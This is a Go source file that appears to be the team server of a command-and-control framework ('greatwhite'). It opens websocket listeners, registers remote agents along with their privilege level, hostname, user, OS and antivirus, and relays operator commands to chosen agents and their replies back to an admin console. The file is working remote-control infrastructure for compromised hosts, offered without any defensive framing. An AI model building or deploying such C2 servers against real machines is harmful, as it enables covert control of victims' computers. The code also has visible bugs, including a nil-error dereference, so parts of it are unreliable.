package teamserver

import (
	"errors"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"time"

	bootstrap "github.com/asticode/go-astilectron-bootstrap"
	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/gopher-socket/transport"
	"github.com/whiterabb17/greatwhite/modules/models"
	"github.com/whiterabb17/greatwhite/modules/util"
)

var (
	MainServer   *gophersocket.Server
	MainChannel  *gophersocket.Channel
	ChannelRooms []string
	userMap      map[string]string
	NodeFarm     []*Node
)

var (
	subscribe   = make(chan (chan<- Subscription), 10)
	unsubscribe = make(chan (<-chan Event), 10)
	publish     = make(chan Event, 10)
)

// Event is to define the event
type Event struct {
	EvtType   string
	User      string
	Timestamp int
	Text      string
}

type Node struct {
	Name     string
	Port     string
	Server   *gophersocket.Server
	MainRoom string
	Channel  *gophersocket.Channel
}

// Subscription is to manage subscribe events
type Subscription struct {
	Archive []Event
	New     <-chan Event
}

// Message is the data structure of messages
type Message struct {
	User      string
	Timestamp int
	Message   string
}
type MyEventData struct {
	Data string `json:"data"`
}

var userStr string
var newMessages chan string

func FindChannel(id string) (*gophersocket.Channel, error) {
	return MainServer.GetChannel(id)
}

func SendToChannel(channel *gophersocket.Channel, event string, message MyEventData) {
	channel.Emit(event, message)
}

func SendAck(channel *gophersocket.Channel, ackEvent string, message MyEventData) (result string, err error) {
	result, err = channel.Ack(ackEvent, message, time.Second*5)
	return
}

func BroadCastToAll(event string, message MyEventData) {
	MainServer.BroadcastToAll(event, message)
}

func BroadCastToRoom(room, event string, message MyEventData) {
	//or for clients joined to room
	MainServer.BroadcastTo(room, event, message)
}

func CreateMainNode(name string, port string) *Node {
	ChannelRooms = append(ChannelRooms, "garden")
	MainServer = gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	log.Println("Creating Administration Node")
	node := &Node{
		Name:     "Lair",
		Port:     "55556",
		Server:   MainServer,
		MainRoom: "garden",
		Channel:  nil,
	}
	//create server instance, you can setup transport parameters or get the default one
	//look at websocket.go for parameters description
	return node
}
func CreateNode(name string, port string) *Node {
	ChannelRooms = append(ChannelRooms, "default")
	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	log.Println("Creating New Node")
	node := &Node{
		Name:     name,
		Port:     port,
		Server:   server,
		MainRoom: "default",
		Channel:  nil,
	}

	//create server instance, you can setup transport parameters or get the default one
	//look at websocket.go for parameters description
	userMap = make(map[string]string)
	return node
}
func ServeMaster(master *Node) {
	MainServer.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
		//client id is unique
		master.Channel = c
		log.Println("New Admin connected, Admin id is ", c.Id()+" \n\n\n")
		if len(models.Network) > 0 {
			log.Println("There are open listeners!")
			var portStr string
			for _, item := range models.Network {
				portStr += item.Name + "@" + strconv.Itoa(item.Port) + "|"
			}
			log.Println(portStr)
			c.Emit("portmap", models.Packet{Event: "portmap", Message: portStr})
		}
		MainChannel = c
	})
	MainServer.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel, args interface{}) {
		//client id is unique
		log.Println("Admin with ID " + c.Id() + " has disconnected \n\n\n")
	})
	MainServer.On("log", func(c *gophersocket.Channel, packet models.Packet) {
		//client id is unique
		log.Println(packet)
	})
	MainServer.On("sendToClient", func(c *gophersocket.Channel, toClient models.ToClient) {
		//log.Println(toClient)
		log.Println("To Send: \nReciever: " + toClient.Tag + "\nCommand: " + toClient.Command + " \nData: " + toClient.Data)
		cChan := getChannelByTag(toClient.Tag)
		cChan.Emit(toClient.Command, models.Resp{Resp: toClient.Data, Tag: toClient.Tag})
	})
	MainServer.On("newListener", func(c *gophersocket.Channel, message models.Packet) {
		log.Println("Starting a new listener on: " + message.Message + " \n\n\n")
		//nodePtr := CreateNode(message.Event, message.Message)
		res := ServeNode(message.Event, message.Message)
		if res.Error() == "reserved" {
			c.Emit("listener", models.Packet{Event: "reserved", Message: "reserved"})
		}
		det := message.Event + ":" + message.Message
		c.Emit("listener", models.Packet{Event: "started", Message: det})
	})
	serveMux := http.NewServeMux()
	serveMux.Handle("/socket.io/", MainServer)
	log.Println("Starting Admin Relay \n\n\n")
	log.Println(http.ListenAndServe(":55556", serveMux))
	//}
}
func getChannelByTag(tag string) (chn *gophersocket.Channel) {
	for _, ch := range models.Agents {
		if ch.Name == tag {
			return ch.Channel
		}
	}
	return
}

var Nodes []*Node

func ServeNode(name string, port string) error {
	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	if len(Nodes) > 0 {
		for _, a := range Nodes {
			if a.Port == port {
				return errors.New("reserved")
			}
		}
	}
	log.Println("Creating New Node")
	node := &Node{
		Name:     name,
		Port:     port,
		Server:   server,
		MainRoom: "default",
		Channel:  nil,
	}
	Nodes = append(Nodes, node)
	func() {
		for {
			//server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
			// --- caller is default handlers
			server.On("reg", func(c *gophersocket.Channel, rep models.Resp) {
				log.Println(rep)
				//MainChannel.Emit("reg", rep)

			})
			//on connection handler, occurs once for each connected client
			server.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
				node.Channel = c
				//client id is unique
				log.Println("New client connected, client id is ", c.Id())
				newMessages = make(chan string)
				userMap[c.Ip()] = c.Id()
				//you can join clients to rooms
				log.Println("Joining new client to " + ChannelRooms[0])
				c.Join(ChannelRooms[0])
				bootstrap.SendMessage(models.MainWindow, "alert", models.Resp{Resp: "NewCLient is connecting", Tag: c.Id()})
				/*
					var channels []*gophersocket.Channel
					var occupents map[*gophersocket.Channel]int
					for _, ca := range ChannelRooms {
						channels = c.List(ca)
						amount := c.Amount(ca)
						occupents = make(map[*gophersocket.Channel]int)
						for cc, _ := range occupents {
							occupents[cc] = amount
						}
					}
					stat := &models.NodeStats{
						Channels:      channels,
						RoomOccupants: occupents,
					}
				*/
				//of course, you can list the clients in the room, or account them

				//				MainChannel.Emit("headcount", models.NodeStats{Channels: stat.Channels, RoomOccupants: stat.RoomOccupants})
				//log.Println(channels)
				//or check the amount of clients in room
				//log.Println(amount, "clients in room")
			})
			server.On("repl", func(c *gophersocket.Channel, reply models.Resp) {
				log.Println("Recieved Reply Message")
				log.Println(reply)
				newMessages <- reply.Resp
				MainChannel.Emit("repl", reply)
			})
			server.On("register", func(c *gophersocket.Channel, info models.ClientInfo) {
				log.Println("CLient is registering")
				cinfo := models.ClientInfo{
					SocketID:  c.Id(),
					Priv:      info.Priv,
					Version:   info.Version,
					IPAddr:    info.IPAddr,
					Hostname:  info.Hostname,
					User:      info.User,
					OS:        info.OS,
					Arch:      info.Arch,
					CPU:       info.CPU,
					GPU:       info.GPU,
					Memory:    info.Memory,
					AntiVirus: info.AntiVirus,
				}
				log.Println(cinfo)
				//MainChannel.Emit("register", cinfo)
				toSend := fmt.Sprintf("%s#%s#Golang", info.SocketID, info.OS)
				bootstrap.SendMessage(models.MainWindow, "newClient", models.Resp{Resp: toSend, Tag: c.Id()})
				newAgent := &models.Agent{
					Name: c.Id(),
					//	Info:    cinfo,
					Channel: c,
				}
				models.Agents = append(models.Agents, newAgent)
				//				models.ClientList = append(models.ClientList, cinfo)
				//
			})
			//on disconnection handler, if client hangs connection unexpectedly, it will still occurs
			//you can omit function args if you do not need them
			//you can return string value for ack, or return nothing for emit
			server.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel) {
				//caller is not necessary, client will be removed from rooms
				//automatically on disconnect
				//but you can remove client from room whenever you need to
				log.Printf("Client %s has disconnected\nRemoving them from %s", c.Id(), ChannelRooms[0])
				c.Leave(ChannelRooms[0])

				if _, found := userMap[c.Ip()]; found {
					delete(userMap, c.Ip())
				}

				log.Println("Disconnection Handle Complete")
				bootstrap.SendMessage(models.MainWindow, "discon", models.Resp{Resp: fmt.Sprintf("Client %s has disconnected", c.Id()), Tag: c.Id()})
			})
			server.On("error", func(c *gophersocket.Channel, resp models.Resp) {
				response, err := util.Fb64(resp.Resp)
				if err != nil {
					response = resp.Resp
				}
				tag, err := util.Fb64(resp.Tag)
				if err != nil {
					tag = resp.Tag
				}
				log.Println(resp)
				bootstrap.SendMessage(models.MainWindow, "error", models.Resp{Resp: tag + "::" + (fmt.Sprintf("<u>Error Encountered</u>\nReponse: <i>%s</i>", response)), Tag: c.Id()})
			})
			//error catching handler
			server.On(gophersocket.OnError, func(c *gophersocket.Channel) {
				log.Println("Error occurs")
			})

			// --- caller is custom handler
			/*
				//custom event handler
				server.On("handle something", func(c *gophersocket.Channel, channel Channel) string {
					log.Println("Something successfully handled")

					//you can return result of handler, in caller case
					//handler will be converted from "emit" to "ack"
					return "result"
				})
			*/
			//setup http server like caller for handling connections
			serveMux := http.NewServeMux()
			serveMux.Handle("/socket.io/", server)
			//go localListen(node.Channel)
			log.Panic(http.ListenAndServe(":"+node.Port, serveMux))
		}
	}()
	return nil
}

// func localListen(c *gophersocket.Channel) {
// 	time.Sleep(10 * time.Second)
// 	for {
// 		fmt.Print("-> ")
// 		OS := bufio.NewScanner(os.Stdin)
// 		OS.Scan()
// 		if OS.Text() != "" {
// 			log.Println(OS.Text())
// 			switch OS.Text() {
// 			case "rcount":
// 				rooms := MainServer.Amount("admindefault")
// 				log.Println("Writing to DB")
// 				pkt := &models.Packet{
// 					Event:   "Room Count",
// 					Message: strconv.Itoa(rooms),
// 				}
// 				network.WriteToGeneralDB(pkt)
// 				log.Printf("Currently there are " + strconv.Itoa(rooms) + " rooms")
// 				//c.Emit("roomcount", MyEventData{strconv.Itoa(rooms)})
// 			case "chans":
// 				chans := MainServer.List("admindefault")
// 				var ret string
// 				for _, s := range chans {
// 					ret = ret + s.Id() + "\n\n"
// 				}
// 				log.Println(ret)
// 				//c.Emit("chanlist", MyEventData{ret})
// 				pkt := &models.Packet{
// 					Event:   "Channel Rooms",
// 					Message: ret,
// 				}
// 				network.WriteToGeneralDB(pkt)
// 			}
// 			c.Emit("repl", MyEventData{OS.Text()})
// 		}
// 		time.Sleep(5 * time.Second)
// 	}
// }

func StartMain(start bool) {
	userMap = make(map[string]string)
	log.Println("Creating Main Server")
	if start {
		mainexec()
	}
}

func mainexec() {
	svr := CreateMainNode("admin", "55556")
	log.Println("Applying Handlers to the Server instance")
	func() {
		ServeMaster(svr)
	}()
}
